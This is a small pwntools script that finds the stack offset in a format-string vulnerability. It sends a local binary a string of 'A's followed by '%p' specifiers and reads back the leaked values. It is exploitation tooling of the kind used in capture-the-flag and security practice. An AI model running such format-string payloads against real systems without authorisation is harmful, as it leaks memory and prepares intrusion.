#!/usr/bin/env python3
import sys
from pwn import *

def find_offset(binary, arch=64):

    a_count = arch//8
    payload = "A"*a_count + ".%p"*100

    p = process(binary)
    p.sendline(payload)
    p.recvuntil("AAAA.")

    offset_string = p.recvline().strip()
    offset_list = offset_string.split(b".")
    offset = offset_list.index(b"0x" + b"41"*a_count) + 1
    print("\n\n",offset)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <binary> [arch]")
        sys.exit(1)
    
    binary = sys.argv[1]
    arch = int(sys.argv[2]) if len(sys.argv) > 2 else 64  # Optional architecture argument
    find_offset(binary, arch)


